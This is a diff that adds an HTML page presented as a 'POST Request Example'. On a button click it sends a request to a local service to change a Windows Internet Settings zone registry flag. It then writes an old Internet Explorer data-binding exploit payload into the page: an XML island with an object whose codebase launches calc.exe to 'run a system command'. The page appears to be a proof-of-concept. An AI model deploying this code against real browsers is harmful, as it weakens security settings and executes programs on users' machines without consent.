@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POST Request Example</title>
+</head>
+<body>
+
+    <h1>Press the button to execute a POST request</h1>
+
+    <button id="postButton">Execute POST</button>
+
+    <script>
+        const element = document.getElementById('postButton').addEventListener('click', function() {
+            // URL to which you want to send the POST request
+            var url = 'http://localhost:5566/';
+
+            // Data to be sent in the POST request (formatted as x-www-form-urlencoded)
+            var data = 'key_path=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0&value=1&value_name=Flags&type=1';
+
+            // Creating a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+
+            // Configuring the request
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+            // Handling the response
+            xhr.onload = function () {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    console.log('POST request successful:', xhr.responseText);
+
+                    // Displaying the response body in the console
+                    var response = JSON.parse(xhr.responseText); // Assuming the response is in JSON format
+                    console.log('Response Body:', response);
+
+                    // You can also display the response body in an alert or on the webpage
+                    // alert('Response Body: ' + JSON.stringify(response));
+                } else {
+                    console.error('POST request failed:', xhr.statusText);
+                }
+            };
+
+            // Handling network errors
+            xhr.onerror = function () {
+                console.error('Network error during POST request');
+            };
+
+            // Sending the request with the form-urlencoded data
+            xhr.send(data);
+            //window.location.href = "C:\\xampp\\htdocs\\web\\cal.html";
+            
+
+            // Example: Run a system command
+            const stringOfExecuting = "<span datasrc=\"#oExec\" datafld=\"exploit\" dataformatas=\"html\"></span>\n<xml id=\"oExec\">\n<security>\n<exploit>\n<object id=\"oFile\"\nclassid=\"clsid：88888888-8888-8888-8888-888888888888\"\ncodebase=\"c：/windows/system32/calc.exe\"></object>\n</exploit>\n</security>\n</xml>\n";
+
+            console.log(document.write(stringOfExecuting));
+        });
+        //element.click();
+    </script>
+
+</body>
+</html>
